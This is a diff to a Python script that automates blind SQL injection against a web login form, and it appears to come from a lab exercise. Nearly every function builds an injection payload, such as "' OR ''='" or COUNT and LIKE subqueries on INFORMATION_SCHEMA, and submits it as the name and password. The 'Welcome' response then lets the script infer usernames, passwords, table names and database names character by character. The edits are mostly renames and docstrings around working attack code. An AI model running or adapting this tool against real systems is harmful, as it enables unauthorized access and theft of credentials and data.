@@ -81,8 +81,10 @@ def readQuery(query):
    """
    # return username in query #fails! Jake is returned regardless of who's logging in unless whole password is entered correctly!
    return "Welcome" in query
-   #should say "Welcome jake you are now logged in!
-   # Log out" if succesful
+   # should say:
+   # "Welcome jake you are now logged in!
+   # Log out"
+   # if succesful
 
 
 def constructPasswordPayload(character, username, index = "no index"):
@@ -107,9 +109,9 @@ def constructPasswordPayload(character, username, index = "no index"):
 
    sqlQuery = constructSQLQuery(character, username, index)
 
-   dickt = {"name" : sqlQuery, "password" : sqlQuery}
+   dikt = {"name" : sqlQuery, "password" : sqlQuery}
 
-   return dickt;
+   return dikt;
 
 
 def constructSQLQuery(character, username, index = "no index"):
@@ -276,7 +278,8 @@ def lessThanAEntries(a, table, url):
    payload = "' OR (SELECT COUNT(*) FROM " + table + ") < " + str(a) + " AND ''='"
    payload = {"name" : payload, "password" : payload}
    txt = sendQuery(payload, url)
-   return readQuery(txt)
+   mhm = readQuery(txt)
+   return mhm 
 
 
 def aEntries(a, table, url):
@@ -301,7 +304,8 @@ def aEntries(a, table, url):
    payload = "' OR (SELECT COUNT(*) FROM " + table + ") = " + str(a) + " AND ''='"
    payload = {"name" : payload, "password" : payload}
    txt = sendQuery(payload, url)
-   return readQuery(txt)
+   mhm = readQuery(txt)
+   return mhm 
 
 
 def userNameLike(ch, url, notLike = False, notLikeName = ""):
@@ -328,7 +332,8 @@ def userNameLike(ch, url, notLike = False, notLikeName = ""):
    payload += "name LIKE '%" + ch + "%') AND ''='"
    payload = {"name" : payload, "password" : payload}
    txt = sendQuery(payload, url)
-   return readQuery(txt)
+   mhm = readQuery(txt)
+   return mhm 
 
 
 def payloadDictionary(payload, lst):
@@ -368,7 +373,8 @@ def isVulnerable(url):
    payload = "' OR ''='"
    payload = NamePasswordDictionary(payload, "name", "password")
    txt = sendQuery(payload, url)
-   return readQuery(txt)
+   mhm = readQuery(txt)
+   return mhm
 
 def characterInTableName(ch, url, index = "no index"):
    """
@@ -376,13 +382,18 @@ def characterInTableName(ch, url, index = "no index"):
    Is there a table called one in database test?
     "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' AND TABLE_NAME='one') AND ''='"
 
-   
+   Args:
+
+   Returns:
+      mhm: boolean
+         true if ch matches at least one table name at index  
 
 """
    payload = constructTableQuery(ch, index)
    payload = NamePasswordDictionary(payload, "name", "password")
    txt = sendQuery(payload, url)
-   return readQuery(txt)
+   mhm = readQuery(txt)
+   return mhm
 
 
 def constructTableQuery(ch, index):
@@ -422,11 +433,6 @@ def nTablesMatch(n, ch, url, index = "no index"):
       N: integer
          if n is greater than or equal to the number of matching tables, returns the number of matching tables. 
          Otherwise prints "nTablesMatch found more than n matches for " + ch, then returns n
-
-   
-   Is there more than one table in the database(s) containing a j?
-       "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '%j%')>1 AND ''='"
-   
    """   
    for i in range(0, n + 1): # Since range(0,k) is 0 1 ... k-2 k-1
       if(not tableMatch(i , ch, url, index)):
@@ -435,7 +441,7 @@ def nTablesMatch(n, ch, url, index = "no index"):
    print("nTablesMatch found more than n matches for " + ch)
    return n
 
-   def tableMatch(n, ch, url, index = "no index"):
+def tableMatch(n, ch, url, index = "no index"):
    """helper function"""
    payload = "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '"
    
@@ -457,15 +463,30 @@ def nTablesMatch(n, ch, url, index = "no index"):
 
 def characterInDatabaseName(ch, url, index = "no index"):
    """
-      
-   Does the current database contain the letter j?
-      "' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%j%') AND ''='"
    
+   Args:
+      ch: string
+         string to match with 
+      url:  string
+         url of form (to submit SQL query)
+      index: integer
+         default is check if ch is anywhere in the database name.
+         with index set, it checks for a match starting at index. 
+         Negative indexes start from end of database name e.g. -2 
+         checks if ch starts is two from the end 
+         (e.g. if database is called Names, index is -2, and ch is me, should return true) 
+   
+   Returns:
+      mhm: boolean      
+         true if ch matches the current database name at ch
+
    """
+
    payload = constructDatabaseQuery(ch, index)
    payload = NamePasswordDictionary(payload, "name", "password")
    txt = sendQuery(payload, url)
-   return readQuery(txt)
+   mhm = readQuery(txt)
+   return mhm 
 
 
 
